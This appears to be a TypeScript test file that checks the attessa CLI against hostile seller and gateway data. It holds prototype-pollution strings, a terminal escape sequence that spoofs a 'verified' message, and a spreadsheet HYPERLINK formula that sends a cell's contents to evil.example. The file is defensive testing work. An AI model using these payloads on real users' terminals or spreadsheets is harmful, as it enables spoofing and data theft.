import { existsSync, mkdtempSync, readFileSync, readdirSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { originHash } from '@attessa/core';
import type { Keychain } from '@attessa/sdk';
import { keccak256, stringToBytes, type Address } from 'viem';
import { generatePrivateKey, privateKeyToAccount } from 'viem/accounts';
import { afterEach, describe, expect, it } from 'vitest';
import { FakeChain } from '../../sdk/test/fakes/chain.ts';
import { FakeGateway } from '../../sdk/test/fakes/gateway.ts';
import type { Deps } from '../src/context.ts';
import { run } from '../src/index.ts';

// Adversary T21 r1: untrusted seller/gateway data reaching the CLI's handlers, terminal and CSV export.

const AGENT = 412n;
const SOURCE = 'https://github.com/acme/risk/commit/a1b2c3d4e5f60718293a4b5c6d7e8f9012345678';

class MemKeychain implements Keychain {
  store = new Map<string, string>();
  async getPassword(s: string, a: string) {
    return this.store.get(`${s}/${a}`) ?? null;
  }
  async setPassword(s: string, a: string, p: string) {
    this.store.set(`${s}/${a}`, p);
  }
}

async function world(sourceRef = SOURCE) {
  const chain = new FakeChain({ startTime: 1_793_000_000n, startBlock: 31_204_000n });
  const rnd = () => privateKeyToAccount(generatePrivateKey());
  const operator = rnd().address.toLowerCase() as Address;
  const payTo = rnd().address.toLowerCase() as Address;
  const enclave = rnd();
  const releaseId = keccak256(stringToBytes(`release-${Math.random()}`));
  chain.approveRelease(AGENT, releaseId, sourceRef);
  const gw = new FakeGateway(chain, { agentId: AGENT, releaseId, payTo, enclave });
  const origin = await gw.start();
  gw.originHash = originHash(origin);
  chain.addEndpoint(AGENT, origin, gw.originHash, payTo, operator);
  chain.registerSigner(enclave.address, AGENT, releaseId, gw.originHash, operator);
  chain.setAccount(payTo, { code: '0x', nonce: 3n, balance: 10n ** 18n });
  chain.advance(5);
  const home = mkdtempSync(join(tmpdir(), 'attessa-adv-'));
  const keychain = new MemKeychain();
  const w = {
    chain,
    gw,
    home,
    url: `${origin}/v1/evaluate`,
    transcript: [] as string[],
    deps(): Deps {
      return {
        io: { out: (l) => void w.transcript.push(l), err: (l) => void w.transcript.push(l), confirm: async () => true },
        env: { ATTESSA_REGISTRY: chain.registry },
        cwd: home,
        home,
        keychain,
        rpc: () => {
          throw new Error('unused');
        },
        runner: { run: async () => ({ code: 1, stdout: '', stderr: '' }) },
        fetch,
        enclave: () => {
          throw new Error('unused');
        },
        readFile: (p) => readFileSync(p),
        writeFile: (p, d) => writeFileSync(p, d),
        exists: (p) => existsSync(p),
        readdir: (p) => readdirSync(p),
        sleep: async () => {},
        arch: 'x64',
        sdk: { transport: chain.transport(), sleep: async (ms: number) => chain.advance(Math.max(1, ms / 1000)), receiptWaitMs: 2000, httpTimeoutMs: 5000 },
      };
    },
    cli: (...argv: string[]) => run(argv, w.deps()),
    call: (...extra: string[]) => run(['call', w.url, '--body', 'tx.json', '--network', 'local', '--rpc', 'http://127.0.0.1:1', ...extra], w.deps()),
    pending(): Array<Record<string, unknown>> {
      const p = join(home, '.attessa', 'pending.jsonl');
      return existsSync(p) ? readFileSync(p, 'utf8').trim().split('\n').filter(Boolean).map((l) => JSON.parse(l)) : [];
    },
    async close() {
      await gw.stop();
      rmSync(home, { recursive: true, force: true });
    },
  };
  writeFileSync(join(home, 'tx.json'), JSON.stringify({ chainId: String(chain.chainId), payTo, asset: chain.asset, amount: '20000' }));
  expect(await w.cli('init', '--network', 'local', '--rpc', 'http://127.0.0.1:1')).toBe(0);
  w.transcript.length = 0;
  return w;
}

let w: Awaited<ReturnType<typeof world>> | undefined;
afterEach(async () => {
  await w?.close();
  w = undefined;
});

describe('adversary T21 r1', () => {
  // FLOWS §8: once a payment permission is signed and the gateway refuses, the CLI prints the "refused,
  // confirming" line and ends in "not charged (confirmed)". The proof_rejected detail is gateway-chosen text.
  it.each(['constructor', '__proto__', 'toString'])(
    'a signed proof_rejected refusal with detail %j still confirms "not charged" (the progress handler must not throw)',
    async (detail) => {
      w = await world();
      w.gw.behavior = { paid: 'refuse', refuseWith: { status: 502, error: 'proof_rejected', detail } };
      let code: number | string;
      try {
        code = await w.call();
      } catch (e) {
        code = `threw: ${(e as Error).message}`;
      }
      expect(code).toBe(1);
      expect(w.pending()[0]!.state).toBe('not_charged');
      expect(w.transcript.some((l) => l.startsWith('Not charged: confirmed on Celo'))).toBe(true);
    },
  );

  // The owner's sourceRef is an on-chain string the seller writes (KNOWN-LIMITS L20: shown as an unverified claim).
  // Raw ESC/CR in it can rewrite the terminal, e.g. erase "(not checked by attessa)".
  it('the owner-claimed source never reaches the terminal with control characters', async () => {
    w = await world('github.com/acme/risk@a1b2c3d\r\x1b[2KOwner build verified by attessa \x1b[8m');
    await w.call('--dry-run');
    const bad = w.transcript.filter((l) => /[\x00-\x08\x0b-\x1f\x7f]/.test(l));
    expect(bad).toEqual([]);
  });

  // `evidence export` CSV opened in a spreadsheet: a seller-chosen cell starting with = + - @ runs as a formula.
  it('evidence export --format csv neutralises a seller-controlled cell that starts with "="', async () => {
    w = await world('=HYPERLINK("https://evil.example/?"&A1,"github.com/acme/risk")');
    expect(await w.call()).toBe(0);
    w.transcript.length = 0;
    expect(await w.cli('evidence', 'export', '--format', 'csv')).toBe(0);
    const cells = w.transcript[1]!.match(/("(?:[^"]|"")*"|[^,]*)(,|$)/g)!.map((c) => c.replace(/,$/, '').replace(/^"|"$/g, ''));
    const src = cells[14]!;
    expect(src).toContain('HYPERLINK');
    expect(/^[=+\-@\t\r]/.test(src)).toBe(false);
  });
});
